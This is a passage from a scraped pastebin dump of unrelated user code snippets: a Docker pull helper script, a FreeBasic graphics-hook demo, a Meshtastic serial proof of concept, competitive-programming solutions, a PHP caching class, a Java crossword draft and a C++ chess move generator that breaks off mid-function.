    echo -e ""\n${RED}Erro: O nome do continer deve comear com letras e nmeros.${NC}""
    return 1
  fi

  if ! docker search ""$container_name"" > /dev/null; then
    echo -e ""\n${RED}Erro: O continer '$container_name' no foi encontrado.${NC}""
    return 1
  fi

  return 0
}

function pull_container() {
  local container_name=""$1""

  if ! docker pull ""$container_name"" 2>&1 | grep -q ""Image is up to date""; then
    echo ""Erro ao fazer o pull do $container_name:""
    echo -e ""$1""
    exit 1
  fi

  echo -e ""\n${GREEN}Pull realizado com sucesso!${NC}""
}

function verificar_resposta() {
  local resposta

  while true; do
    echo -e ""\n""
    read -rp ""Deseja fazer pull? [Ss/Nn]: "" resposta

    case ""$resposta"" in
      [Ss])
        return 0
        ;;
      [Nn])
        echo -e ""\n${YELLOW}Pull cancelado.${NC}""
        exit 0
        ;;
      *)
        echo -e ""\n${RED}Resposta invlida. Digite 'S' para sim ou 'N' para no.${NC}""
        ;;
    esac
  done
}

function main() {
  local container_name

  while true; do
    read -rp ""Digite o nome do continer: "" container_name

    if verificar_container_name ""$container_name""; then
      clear
      echo -e ""\n""
      docker search ""$container_name""
      break
    fi

    echo -e ""\n${YELLOW}Nome de continer invlido. Tente novamente.${NC}""
  done

  if verificar_resposta; then
    while true; do
      read -rp ""Digite novamente o nome do continer para pull e aguarde instantes: "" novo_container_name

      if [[ -n ""$novo_container_name"" ]]; then
        pull_container ""$novo_container_name""
        break
      fi

      echo -e ""\n${YELLOW}Nome de continer no pode estar vazio. Tente novamente.${NC}""
    done
  fi
}

main
"
hQVi9ryE,Untitled,Mysoft,FreeBasic,Saturday 17th of February 2024 04:09:37 PM CDT,"#include ""fbgfx.bi""
#include ""windows.bi""
#include ""crt.bi""

'289 = Paint function , 290 = Thread function
extern GfxWin32(290) alias ""fb_win32"" as any ptr

screencontrol(fb.SET_DRIVER_NAME,""GDI"")
screenres 640,480
screensync

function AutoPatch( pSource as any ptr , pBase as any ptr , pTarget as any ptr ) as any ptr    
  dim as any ptr ptr pFound = pBase
  var pSource2 = *cptr(any ptr ptr,pSource+2)  
  if pTarget then 'do the hook
    var uBase = cuint(pBase) : pFound=0
    for uOff as uinteger = uBase to uBase+165535
      if *cptr(any ptr ptr ptr,uOff) = pSource2 then
        pFound = cptr(any ptr ptr,uOff) : exit for    
      end if
    next uOff
  else 'undo the hook
    pTarget = pSource
  end if
  if pFound = 0 then return 0
  dim as DWORD OldProt = any
  VirtualProtect( pFound , 4 , PAGE_EXECUTE_READWRITE , @OldProt )
  *pFound = pTarget
  VirtualProtect( pFound , 4 , OldProt , @OldProt )
  FlushInstructionCache( GetCurrentProcess() , pFound , 4 )
  return pFound
end function  

function SetDIBitsToDevice_Detour( hdc as HDC , xDest as long , yDest as long , dwWidth as DWORD , dwHeight as DWORD , XSrc as long , YSrc as long , uStartScan as ulong , cScanLines as ulong , lpvBits as any ptr , lpBmi as BITMAPINFO ptr , fuColorUse as ulong ) as long
  printf(!""update: h=%p xx=%i yy=%i w=%i h=%i x=%i y=%i t=%i n=%i\n"",hdc,xDest,yDest,dwWidth,dwHeight,XSrc,YSrc,uStartScan,cScanlines)
  return SetDIBitsToDevice( hdc , xDest , yDest , dwWidth , dwHeight , XSrc , YSrc , uStartScan , cScanLines , lpvBits , lpBmi , fuColorUse )  
end function
static shared as any ptr pSetDIBitsToDevice_Detour = @SetDIBitsToDevice_Detour

var pBase1 = AutoPatch( @SetDIBitsToDevice , GfxWin32(289) , @pSetDIBitsToDevice_Detour )
var pBase2 = AutoPatch( @SetDIBitsToDevice , GfxWin32(289) , @pSetDIBitsToDevice_Detour )

SetForegroundWindow(GetConsoleWindow())

screenlock

dim as ubyte ptr pScr = screenptr

'changing screen but it wont update since it's locked
for N as long = 0 to 640*480-1
  pScr[N] = 10 'make whole screen green
next N
puts(!""screen is locked, it will show it in 2 seconds.\n"")
sleep 2000,1

'however calling the internal paint function it will update even locked
dim fnPaint as sub cdecl() = GfxWin32(289)
fnPaint()
puts(!""\nthis called the internal paint function so it forced update"")

'so now changing again but again wont update till the screenunlock is called
for N as long = 0 to 640*480-1
  pScr[N] = 12 'make whole screen red
next N
puts(!""now i painted red you will only see after pressing enter which leaves the lock"")
getchar()

screenunlock

sleep 100,1
screensync

for N as long = 0 to 640*480-1
  pScr[N] = 14 'make whole screen yellow
next N
puts(!""\nand now after enter you will see only a partial update"")
getchar()

line(0,0)-(0,239),0,,0

'and since it got unlocked it then updated as red
getchar()


"
xm8h5vnv,Meshtastic BBS .000000001 Proof Of Concept.sh,howtophil,Bash,Saturday 17th of February 2024 04:03:25 PM CDT,"#!/bin/bash
#----------------------------------
# See newer version here: https://pastebin.com/UcF6i5mi
# A proof of concept to watch for
# messages and respond to Meshtastic
# messages over serial (USBserial).
# Make sure ""Debug log enabled""
# is checked to on in the
# Radio Configuration->Device menu
# of Meshtastic
# ~HowToPhil 2024/02/17
#----------------------------------

while [ 1==1 ]; do
        #configure the USB serial port properly
        stty -F /dev/ttyUSB0 115200 -echo -icrnl raw

        #start watching for a command
        COMMANDRAW=$(grep -a -m1 ""@meshbbs"" /dev/ttyUSB0| grep ""^INFO"")

        #do something with the command
        echo ""GOT $COMMANDRAW""
        meshtastic --sendtext ""$COMMANDRAW""
done
"
e9BqEizB,independence,aquiem,C++,Saturday 17th of February 2024 03:54:00 PM CDT,"#include <bits/stdc++.h>
 
#define INTMAX 2147483647
#define LONGMAX 9223372036854775807
#define int long long
#define rep(i, start, end) for (i = start; i < end; i++)
#define rep_rev(i, start, end) for (i = start; i >= end; i--)
#define P pair<long long, long long>
#define Q 1000000007
#define F first
#define S second
#define append push_back
 
using namespace std;
 
const int N = 3000;
char a[N][N];
int down[N][N];
int ryt[N][N];
int n, m;
string s;
 
int t[N][4 * N];
 
void read()
{
    int i, j, k;
    cin >> n >> m;
    rep(i, 1, n + 1)
            rep(j, 1, m + 1)
                cin >>
        a[i][j];
}
 
void build_tree(int col, int v, int tl, int tr)
{
    int tm = (tl + tr) / 2;
    if (tl == tr)
    {
        t[col][v] = ryt[tm][col];
    }
    else
    {
        build_tree(col, v * 2, tl, tm);
        build_tree(col, v * 2 + 1, tm + 1, tr);
        t[col][v] = min(t[col][v * 2], t[col][v * 2 + 1]);
    }
}
 
int min_query(int col, int v, int tl, int tr, int l, int r)
{
    if (tr < l or tl > r)
        return INTMAX;
    if (l <= tl && tr <= r)
    {
        return t[col][v];
    }
    int tm = (tl + tr) / 2;
    return min(min_query(col, v * 2, tl, tm, l, r), min_query(col, v * 2 + 1, tm + 1, tr, l, r));
}
 
void solve()
{
    int i, j, k;
    rep(j, 1, m + 1)
        down[n][j] = 1;
    rep_rev(i, n - 1, 1)
        rep(j, 1, m + 1) if (a[i][j] == a[i + 1][j])
            down[i][j] = down[i + 1][j] + 1;
    else down[i][j] = 1;
    rep(i, 1, n + 1)
        ryt[i][m] = 1;
    rep_rev(j, m - 1, 1)
        rep(i, 1, n + 1) if (a[i][j] == a[i][j + 1])
            ryt[i][j] = ryt[i][j + 1] + 1;
    else ryt[i][j] = 1;
 
    rep(j, 1, m + 1)
        build_tree(j, 1, 1, n);
 
    int ans = 0;
    rep(i, 1, n + 1)
        rep(j, 1, m + 1)
    {
        int row_1 = i;
        int row_2 = row_1 + down[row_1][j];
        int row_3 = row_2 + down[row_2][j];
        int col = 0;
        if (down[row_1][j] == down[row_2][j] and down[row_2][j] <= down[row_3][j])
            col = min_query(j, 1, 1, n, row_1, row_1 + 3 * down[row_1][j] - 1);
        ans += col;
    }
    cout << ans;
}
 
int32_t main()
{
    int T = 1;
    // cin >> T;
    while (T--)
    {
        read();
        solve();
    }
}"
11kvCZKv,no sad students,aquiem,C++,Saturday 17th of February 2024 03:53:16 PM CDT,"#include <bits/stdc++.h>
using namespace std;
using ll = long long;
 
ll mod = 1e9 + 7;
 
int main()
{
    ll t;
    cin >> t;
    while (t--)
    {
        ll n, k;
        cin >> n >> k;
        string givenStr;
        cin >> givenStr;
        vector<char> count(n / k, '.');
        bool good = true;
        for (int i = 0; i < n; i++)
        {
            if (count[i % k] == '.')
            {
                count[i % k] = givenStr[i];
                continue;
            }
            if (givenStr[i] == '.')
            {
                continue;
            }
            if (count[i % k] != givenStr[i])
            {
                good = false;
            }
        }
 
        if (good)
        {
            cout << ""YES\n"";
            continue;
        }
        cout << ""NO\n"";
    }
    return 0;
}"
nY8rBrfa,safe GT,aquiem,C++,Saturday 17th of February 2024 03:52:26 PM CDT,"#include <bits/stdc++.h>
using namespace std;
using ll = long long;

ll mod = 1e9 + 7;

int main()
{
    ll t;
    cin >> t;
    while (t--)
    {
        ll n;
        cin >> n;
        vector<ll> givenNums;
        for (int i = 0; i < n; i++)
        {
            ll temp;
            cin >> temp;
            givenNums.push_back(temp);
        }

        sort(givenNums.begin(), givenNums.end());
        vector<ll> ans;
        ans.push_back(givenNums[0]);
        for (int i = 1; i < n; i++)
        {
            if (givenNums[i] - 1 == givenNums[i - 1])
            {
                givenNums[i] = -1;
                continue;
            }
            ans.push_back(givenNums[i]);
        }

        cout << ans.size() << ""\n"";
        for (auto i : ans)
        {
            cout << i << "" "";
        }
        cout << ""\n"";
    }
    return 0;
}"
iwVQrLhn,scheming students,aquiem,C++,Saturday 17th of February 2024 03:50:56 PM CDT,"#include <bits/stdc++.h>
using namespace std;
using ll = long long;
 
ll mod = 1e9 + 7;
 
int main()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    ll t;
    cin >> t;
    while (t--)
    {
        ll n, m;
        cin >> n >> m;
        vector<ll> givenNums;
        for (int i = 0; i < n; i++)
        {
            ll temp;
            cin >> temp;
            givenNums.push_back(temp);
        }
 
        vector<ll> xorPrefix;
        xorPrefix.push_back(0);
        for (int i = 0; i < n; i++)
        {
            xorPrefix.push_back(givenNums[i] ^ xorPrefix[xorPrefix.size() - 1]);
        }
 
        while (m--)
        {
            ll l, r;
            cin >> l >> r;
            cout << (xorPrefix[l - 1] ^ xorPrefix[r]) << ""\n"";
        }
        cout << ""\n"";
    }
    return 0;
}"
HV9bGQQw,Untitled,toorr2p,PHP,Saturday 17th of February 2024 03:50:51 PM CDT,"<?php
require_once 'cached.php';
include_once('../../pdo/CDatabase.php');
include_once('../../pdo/CQuery.php');

class StaticPage extends Cached
{
    //  
    public function __construct(protected ?int $id)
    {

        // ,    
        parent::__construct($this->title(), $this->content());

        // ,      
        if ($this->isCached($this->id($id))) {
            // ,    
            //parent::__construct($this->title(), $this->content());
        } else {
            //    , 
            //    

            /*
            CREATE TABLE `static_pages` (`ID` int NOT NULL AUTO_INCREMENT,
            `TITLE` varchar(255) NOT NULL,
            `CONTENT` TEXT NULL,
            `DATE_INSERT` TIMESTAMP NOT NULL,
             PRIMARY KEY (`ID`)
            );

            INSERT INTO `static_pages` (`TITLE`, `CONTENT`) VALUES (' ', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.');
            */

            $dbh = new CDatabase('php8db', 'php8u', 'qwerty');
            $query = new CQuery(
                'SELECT * FROM `static_pages` WHERE id = :id LIMIT 1', 
                [$id],
                $dbh
            );

            if ($page = $query->fetch()) {
                var_dump($page);
                echo '\n';

                parent::__construct($page['TITLE'], $page['CONTENT']);

                //    
                $this->set($this->id($id), 1);
                parent::__construct(
                    $page['TITLE'],
                    $page['CONTENT']
                );
            }

        }
    }

    //    
    public function id(mixed $name) : string
    {
      return ""static_page_{$name}"";
    }
}"
eJswak7c,Heart Delivery,Osiris1002,Python,Saturday 17th of February 2024 03:42:45 PM CDT,"neighborhood = list(map(int, input().split('@')))
current_index = 0
 
while True:
    command = input()
 
    if command == 'Love!':
        break
 
    command_split = command.split()
    step = int(command_split[1])
 
    if current_index + step <= len(neighborhood) - 1:
        current_index += step
        if neighborhood[current_index] == 0:
            print(f""Place {current_index} already had Valentine's day."")
        else:
            neighborhood[current_index] -= 2
            if neighborhood[current_index] == 0:
                print(f""Place {current_index} has Valentine's day."")
 
    else:
        current_index = 0
        if neighborhood[current_index] == 0:
            print(f""Place {current_index} already had Valentine's day."")
        else:
            neighborhood[current_index] -= 2
            if neighborhood[current_index] == 0:
                print(f""Place {current_index} has Valentine's day."")
 
 
print(f""Cupid's last position was {current_index}."")
 
if sum(neighborhood) == 0:
    print(""Mission was successful."")
else:
    failed_houses = [house for house in neighborhood if house != 0]
    print(f""Cupid has failed {len(failed_houses)} places."")"
v6nELzJF,Crossword Game,TurtyWurty,Java,Saturday 17th of February 2024 03:42:07 PM CDT,"@Getter
    public static class Game {
        private static final Random RANDOM = new Random();
        private final List<String> words;
        private final Map<String, List<Pair<Integer, Integer>>> wordLocations = new HashMap<>();
        private final int wordCount;
        private final long guildId, userId, channelId;
        private char[][] board;
        @Setter
        private long threadId;

        public Game(int wordCount, long guildId, long userId, long channelId) throws IllegalStateException {
            if (wordCount < 1)
                throw new IllegalStateException(""Word count must be greater than 0!"");

            this.wordCount = wordCount;

            this.words = getWords(wordCount);
            if (this.words.isEmpty())
                throw new IllegalStateException(""Failed to get words for crossword!"");

            this.guildId = guildId;
            this.userId = userId;
            this.channelId = channelId;

            this.board = new char[10][10];
            fillBoard();
        }

        private static List<String> getWords(int wordCount) {
            Either<List<String>, HttpStatus> response = ApiHandler.getWords(new RandomWordRequestData.Builder()
                    .length(3, 10)
                    .amount(wordCount)
                    .build());
            if (response.isLeft())
                return List.copyOf(response.getLeft());
            else
                Constants.LOGGER.error(""Failed to get words for crossword! Status: "" + response.getRight());

            return List.of();
        }

        private boolean hasCharacter(int row, int column, char character) {
            return this.board[row][column] == character;
        }

        private boolean isEmpty(int row, int column) {
            return hasCharacter(row, column, '\u0000');
        }

        public boolean isOutsideBounds(int x, int y) {
            return y < 0 || y >= this.board.length || x < 0 || x >= this.board[y].length;
        }

        private void fillBoard() {
            List<String> sorted = this.words.stream().sorted(Comparator.comparingInt(String::length).reversed()).toList();
            String first = sorted.getFirst();
            while (first.length() >= this.board.length)
                expandBoard();

            int x = RANDOM.nextInt(this.board.length - first.length());
            int y = RANDOM.nextInt(this.board.length - first.length());
            boolean horizontal = RANDOM.nextBoolean();
            forcePlaceWord(first, x, y, horizontal);

            List<String> failed = new CopyOnWriteArrayList<>();
            for (int i = 1; i < sorted.size(); i++) {
                String word = sorted.get(i);
                Pair<Integer, Integer> location = findValidLocation(word);
                if (location == null) {
                    failed.add(word);
                    continue;
                }

                forcePlaceWord(word, location.getLeft(), location.getRight(), RANDOM.nextBoolean());
            }

            while (!failed.isEmpty()) {
                for (String word : failed) {
                    Pair<Integer, Integer> location = findValidLocation(word);
                    if (location == null) {
                        continue;
                    }

                    failed.remove(word);
                    forcePlaceWord(word, location.getLeft(), location.getRight(), RANDOM.nextBoolean());
                }
            }
        }

        private Pair<Integer, Integer> findValidLocation(String word) {
            for (Map.Entry<String, List<Pair<Integer, Integer>>> entry : wordLocations.entrySet()) {
                
            }

            return null;  // No valid intersection found
        }

        private void forcePlaceWord(String word, int x, int y, boolean horizontal) {
            List<Pair<Integer, Integer>> locations = new ArrayList<>();
            if (horizontal) {
                for (int i = 0; i < word.length(); i++) {
                    if (isOutsideBounds(x + i, y)) {
                        expandBoard();
                    }
                }

                for (int i = 0; i < word.length(); i++) {
                    board[x + i][y] = word.charAt(i);
                    locations.add(Pair.of(x + i, y));
                }
            } else {
                for (int i = 0; i < word.length(); i++) {
                    if (isOutsideBounds(x, y + i)) {
                        expandBoard();
                    }
                }

                for (int i = 0; i < word.length(); i++) {
                    board[x][y + i] = word.charAt(i);
                    locations.add(Pair.of(x, y + i));
                }
            }

            this.wordLocations.put(word, locations);
        }

        private boolean isValidIntersection(String word, int x, int y, boolean horizontal) {
            /
        }

        private void expandBoard() {
            char[][] oldBoard = this.board;
            this.board = new char[this.board.length + 1][this.board[0].length + 1];
            for (int j = 0; j < oldBoard.length; j++) {
                System.arraycopy(oldBoard[j], 0, this.board[j], 0, oldBoard[j].length);
            }
        }

        private void expandBoardNegatively() {
            char[][] oldBoard = this.board;
            this.board = new char[this.board.length + 1][this.board[0].length + 1];
            for (int j = 0; j < oldBoard.length; j++) {
                System.arraycopy(oldBoard[j], 0, this.board[j + 1], 0, oldBoard[j].length);
            }
        }

        public char get(int x, int y) {
            return this.board[x][y];
        }
    }"
iGzAZG6R,mriv3_7feb,VladNitu,C++,Saturday 17th of February 2024 03:23:02 PM CDT,"#include <cstdio>
#include <vector>
#include <string>
#include <cstdlib>
#include <iostream>
#include <algorithm>
#include <cstring>

using namespace std;

constexpr int inf = 1e9;
constexpr int maxv = 100;

const vector<vector<int>> dx({{2, 2, 1, 1, -1, -1, -2, -2}, {-1, -1, 1, 1}, {1, -1, 0, 0}, {-1, -1, 1, 1, 1, -1, 0, 0}, {-1, -1, -1, 0, 1, 1, 1, 0}});
const vector<vector<int>> dy({{1, -1, 2, -2, 2, -2, 1, -1}, {-1, 1, -1, 1}, {0, 0, 1, -1}, {-1, 1, -1, 1, 0, 0, 1, -1}, {-1, 0, 1, 1, 1, 0, -1, -1}});
const vector<int> steps({1, 7, 7, 7, 1});

struct Cell {
    int x, y;

    Cell() {
        x = y = -1;
    }

    Cell(int _x, int _y) {
        x = _x;
        y = _y;
    }

    inline Cell operator+ (const Cell& other) const {
        return {x + other.x, y + other.y};
    }

    inline constexpr bool operator ==(const Cell& other) const {
        return x == other.x && y == other.y;
    }

    [[nodiscard]] inline constexpr bool inRange() const {
        if (1 <= x && x <= 8
            && 1 <= y && y <= 8)
            return true;
        return false;
    }
};

struct Piece {
    enum PieceType {
        Pawn = -1,
        Knight = 0,
        Bishop = 1,
        Rook = 2,
        Queen = 3,
        King = 4
    };

    PieceType type;
    Cell cell;
    char color;

    inline Piece () = default;

    Piece(PieceType _type, Cell _cell, char _color) {
        type = _type;
        cell = _cell;
        color = _color;
    }

    Piece(char c, int x, int y) {
        if (isupper(c)) {
            color = 'w';
            c = tolower(c);
        } else {
            color = 'b';
        }

        if (c == 'p')
            type = Pawn;
        else if (c == 'n')
            type = Knight;
        else if (c == 'b')
            type = Bishop;
        else if (c == 'r')
            type = Rook;
        else if (c == 'q')
            type = Queen;
        else if (c == 'k')
            type = King;

        cell = Cell(x, y);
    }

};

struct BoardState;
string generateFEN(BoardState board, bool includeMoves);

struct BoardState {
    vector<Piece> pieces;
    char activeColor;
    char whiteCastling;
    char blackCastling;
    Cell enPassant;
    int halfMoves;
    int fullMoves;

    [[nodiscard]] inline bool isInCheck(char color) const {
        Cell kingPosition;
        for (const Piece& piece : pieces) {
            if (piece.color == color && piece.type == Piece::King) {
                kingPosition = piece.cell;
                break;
            }
        }
        vector<vector<bool> > attacked = attackedCells(color ^ 'w' ^ 'b');
        return attacked[kingPosition.x][kingPosition.y];
    }

    [[nodiscard]] inline bool isDraw() const {
        if (halfMoves >= 50 || pieces.size() == 2)
            return true;
        vector<BoardState> boardStates = generateAllMoves();
        if (boardStates.empty() && !isInCheck(activeColor))
            return true;
        return false;
    }


    [[nodiscard]] inline bool isCheckMate() const {
        if (!isInCheck(activeColor))
            return false;
        vector<BoardState> boardStates = generateAllMoves();
        return boardStates.empty();
    }

    [[nodiscard]] inline vector<vector<bool> > attackedCells(char color) const {
        char b[10][10];
        memset(b, 0, sizeof(b));
        for (const Piece& piece : pieces) {
            b[piece.cell.x][piece.cell.y] = (piece.color == 'w' ? 1 : -1);
        }
        vector<vector<bool> > isAttacked(9, vector<bool>(9, false));
        for (const Piece& piece : pieces) {
            if (piece.color != color)
                continue;
            if (piece.type != Piece::Pawn) {
                for (int dir = 0; dir < dx[piece.type].size(); ++dir) {
                    Cell cell = piece.cell;
                    Cell dirCell = Cell(dx[piece.type][dir], dy[piece.type][dir]);
                    for (int step = 1; step <= steps[piece.type]; ++step) {
                        cell = cell + dirCell;
                        if (!cell.inRange())
                            break;
                        if (b[cell.x][cell.y] != 0) {
                            if (b[cell.x][cell.y] == 1 && color == 'b')
                                isAttacked[cell.x][cell.y] = true;
                            else if (b[cell.x][cell.y] == -1 && color == 'w')
                                isAttacked[cell.x][cell.y] = true;
                            break;
                        }
                        isAttacked[cell.x][cell.y] = true;
                    }
                }
            } else {
                if (piece.color == 'w') {
                    Cell newCell = piece.cell + Cell(1, -1);
                    if (newCell.inRange() && b[newCell.x][newCell.y] != 1)
                        isAttacked[newCell.x][newCell.y] = true;
                    newCell = piece.cell + Cell(1, 1);
                    if (newCell.inRange() && b[newCell.x][newCell.y] != 1)
                        isAttacked[newCell.x][newCell.y] = true;
                } else if (piece.color == 'b') {
                    Cell newCell = piece.cell + Cell(-1, -1);
                    if (newCell.inRange() && b[newCell.x][newCell.y] != -1)
                        isAttacked[newCell.x][newCell.y] = true;
                    newCell = piece.cell + Cell(-1, 1);
                    if (newCell.inRange() && b[newCell.x][newCell.y] != -1)
                        isAttacked[newCell.x][newCell.y] = true;
                }
            }
        }
        return isAttacked;
    }

    [[nodiscard]] inline vector<BoardState> generateAllMoves() const {
        vector<BoardState> newBoards;

        char newColor = activeColor ^ 'w' ^ 'b';

        char b[10][10];
        memset(b, 0, sizeof(b));
        for (const Piece& piece : pieces) {
            char p;
            if (piece.type == Piece::Pawn) {
                p = 'p';
            } else if (piece.type == Piece::Knight) {
                p = 'n';
            } else if (piece.type == Piece::Bishop) {
                p = 'b';
            } else if (piece.type == Piece::Rook) {
                p = 'r';
            } else if (piece.type == Piece::Queen) {
                p = 'q';
            } else if (piece.type == Piece::King) {
                p = 'k';
            }
            if (piece.color == 'w')
                p = toupper(p);
            b[piece.cell.x][piece.cell.y] = p;
        }

        for (int pieceIdx = 0; pieceIdx < pieces.size(); ++pieceIdx) {
            Piece piece = pieces[pieceIdx];
            if (piece.color != activeColor)
                continue;

            vector<Cell> endPositions;
            if (piece.type == Piece::Pawn) {
                if (piece.color == 'w') {
                    Cell newCell = piece.cell + Cell(1, -1);
                    if (newCell.inRange() && b[newCell.x][newCell.y] != 0 && islower(b[newCell.x][newCell.y]) && b[newCell.x][newCell.y] != 'k')
                        endPositions.push_back(newCell);
                    newCell = piece.cell + Cell(1, 1);
                    if (newCell.inRange() && b[newCell.x][newCell.y] != 0 && islower(b[newCell.x][newCell.y]) && b[newCell.x][newCell.y] != 'k')
                        endPositions.push_back(newCell);
                    newCell = piece.cell + Cell(1, 0);
                    if (newCell.inRange() && b[newCell.x][newCell.y] == 0) {
                        endPositions.push_back(newCell);
                        if (piece.cell.x == 2) {
                            newCell = newCell + Cell(1, 0);
                            if (b[newCell.x][newCell.y] == 0)
                                endPositions.push_back(newCell);
                        }
                    }
                } else if (piece.color == 'b') {
                    Cell newCell = piece.cell + Cell(-1, -1);
                    if (newCell.inRange() && b[newCell.x][newCell.y] != 0 && isupper(b[newCell.x][newCell.y]) && b[newCell.x][newCell.y] != 'K')
                        endPositions.push_back(newCell);
                    newCell = piece.cell + Cell(-1, 1);
                    if (newCell.inRange() && b[newCell.x][newCell.y] != 0 && isupper(b[newCell.x][newCell.y]) && b[newCell.x][newCell.y] != 'K')
                        endPositions.push_back(newCell);
                    newCell = piece.cell + Cell(-1, 0);
                    if (newCell.inRange() && b[newCell.x][newCell.y] == 0) {
                        endPositions.push_back(newCell);
                        if (piece.cell.x == 7) {
                            newCell = newCell + Cell(-1, 0);
                            if (b[newCell.x][newCell.y] == 0)
                                endPositions.push_back(newCell);
                        }
                    }
                }
            } else {
                for (int dir = 0; dir < dx[piece.type].size(); ++dir) {
                    Cell cell = piece.cell;
                    Cell dirCell = Cell(dx[piece.type][dir], dy[piece.type][dir]);
                    for (int step = 1; step <= steps[piece.type]; ++step) {
                        cell = cell + dirCell;
                        if (!cell.inRange())
                            break;
                        if (b[cell.x][cell.y] != 0) {
                            if (isupper(b[cell.x][cell.y]) && activeColor == 'b' && b[cell.x][cell.y] != 'K')
                                endPositions.push_back(cell);
                            else if (islower(b[cell.x][cell.y]) && activeColor == 'w' && b[cell.x][cell.y] != 'k')
                                endPositions.push_back(cell);
                            break;
                        } else {
                            endPositions.push_back(cell);
                        }
                    }
                }
            }
            for (Cell endPosition : endPositions) {
                BoardState newBoard;
                char oldPiece = b[endPosition.x][endPosition.y];
                b[endPosition.x][endPosition.y] = 0;
                newBoard.pieces = pieces;
                newBoard.activeColor = newColor;
                newBoard.fullMoves = fullMoves + 1;
                // compute newBoard.enPassant
                if (piece.type == Piece::Pawn && abs(endPosition.x - piece.cell.x) == 2) {
                    newBoard.enPassant = piece.cell + Cell((endPosition.x - piece.cell.x) / 2, 0);
                } else {
                    newBoard.enPassant = Cell(-1, -1);
                }
                // compute newBoard.castling
                newBoard.whiteCastling = newBoard.blackCastling = 0;
                if (whiteCastling & 1) {
                    // K
                    if (b[1][5] == 'K' && b[1][8] == 'R')
                        newBoard.whiteCastling += 1;
                }
                if (whiteCastling & 2) {
                    // Q
                    if (b[1][5] == 'K' && b[1][1] == 'R')
                        newBoard.whiteCastling += 2;
                }
                if (blackCastling & 1) {
                    // k
                    if (b[8][5] == 'k' && b[8][8] == 'r')
                        newBoard.blackCastling += 1;
                }
                if (blackCastling & 2) {
                    // q
                    if (b[8][5] == 'k' && b[8][1] == 'r')
                        newBoard.blackCastling += 2;
                }
                b[endPosition.x][endPosition.y] = oldPiece;
                if (piece.type == Piece::Pawn || b[endPosition.x][endPosition.y] != 0)
                    newBoard.halfMoves = 0;
                else
                    newBoard.halfMoves = halfMoves + 1;
                newBoard.pieces[pieceIdx].cell = endPosition;
                if (b[endPosition.x][endPosition.y] != 0) {
                    for (int removeIdx = 0; removeIdx < newBoard.pieces.size(); ++removeIdx) {
                        if (newBoard.pieces[removeIdx].cell == endPosition && newBoard.pieces[removeIdx].color != activeColor) {
                            swap(newBoard.pieces[removeIdx], newBoard.pieces.back());
                            newBoard.pieces.pop_back();
                            break;
                        }
                    }
                }
                if (piece.type == Piece::Pawn && (endPosition.x == 1 || endPosition.x == 8)) {
                    for (auto newPieceType : {Piece::Queen, Piece::Knight, Piece::Bishop, Piece::Rook}) {
                        newBoard.pieces[pieceIdx].type = newPieceType;
                        if (!newBoard.isInCheck(activeColor)) {
                            newBoards.push_back(newBoard);
                        }
                    }
                } else if (!newBoard.isInCheck(activeColor)) {
                    newBoards.push_back(newBoard);
                }
            }
        }

        // implement en passant
        if (enPassant.x != -1) {
            int upDir = (activeColor == 'w' ? 1 : -1);
            for (int dir : {-1, 1}) {
                Cell capturePawn = enPassant + Cell(-upDir, dir);
                Cell toCapturePawn = enPassant + Cell(-upDir, 0);
                if (capturePawn.inRange() &&
                    ((activeColor == 'w' && b[capturePawn.x][capturePawn.y] == 'P') ||
                     (activeColor == 'b' && b[capturePawn.x][capturePawn.y] == 'p'))) {
                    BoardState newBoard;
                    newBoard.pieces = pieces;
                    newBoard.activeColor = newColor;
                    newBoard.whiteCastling = whiteCastling;
                    newBoard.blackCastling = blackCastling;
                    newBoard.fullMoves = fullMoves + 1;
                    newBoard.halfMoves = 0;
                    newBoard.enPassant = Cell(-1, -1);
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == capturePawn) {
                            piece.cell = enPassant;
                            break;
                        }
                    }
                    for (int pieceIdx = 0; pieceIdx < newBoard.pieces.size(); ++pieceIdx) {
                        if (newBoard.pieces[pieceIdx].cell == toCapturePawn) {
                            swap(newBoard.pieces[pieceIdx], newBoard.pieces.back());
                            newBoard.pieces.pop_back();
                            break;
                        }
                    }
                    if (!isInCheck(activeColor)) {
                        newBoards.push_back(newBoard);
                    }
                }
            }
        }
        // implement castling
        if (activeColor == 'w') {
            vector<vector<bool>> attacked = attackedCells(newColor);
            if (whiteCastling & 1) {
                bool invalid = false;
                for (int col = 6; col <= 7; ++col) {
                    if (b[1][col] != 0) {
                        invalid = true;
                        break;
                    }
                }
                for (int col = 5; col <= 6; ++col) {
                    if (attacked[1][col]) {
                        invalid = true;
                        break;
                    }
                }
                if (!invalid) {
                    BoardState newBoard;
                    newBoard.pieces = pieces;
                    newBoard.activeColor = newColor;
                    newBoard.whiteCastling = 0;
                    newBoard.blackCastling = blackCastling;
                    newBoard.fullMoves = fullMoves + 1;
                    newBoard.halfMoves = halfMoves + 1;
                    newBoard.enPassant = Cell(-1, -1);
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == Cell(1, 5)) {
                            piece.cell = Cell(1, 7);
                            break;
                        }
                    }
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == Cell(1, 8)) {
                            piece.cell = Cell(1, 6);
                            break;
                        }
                    }
                    if (!isInCheck(activeColor)) {
                        newBoards.push_back(newBoard);
                    }
                }
            }
            if (whiteCastling & 2) {
                bool invalid = false;
                for (int col = 2; col <= 4; ++col) {
                    if (b[1][col] != 0) {
                        invalid = true;
                        break;
                    }
                }
                for (int col = 3; col <= 5; ++col) {
                    if (attacked[1][col]) {
                        invalid = true;
                        break;
                    }
                }
                if (!invalid) {
                    BoardState newBoard;
                    newBoard.pieces = pieces;
                    newBoard.activeColor = newColor;
                    newBoard.whiteCastling = 0;
                    newBoard.blackCastling = blackCastling;
                    newBoard.fullMoves = fullMoves + 1;
                    newBoard.halfMoves = halfMoves + 1;
                    newBoard.enPassant = Cell(-1, -1);
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == Cell(1, 5)) {
                            piece.cell = Cell(1, 3);
                            break;
                        }
                    }
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == Cell(1, 1)) {
                            piece.cell = Cell(1, 4);
                            break;
                        }
                    }
                    if (!isInCheck(activeColor)) {
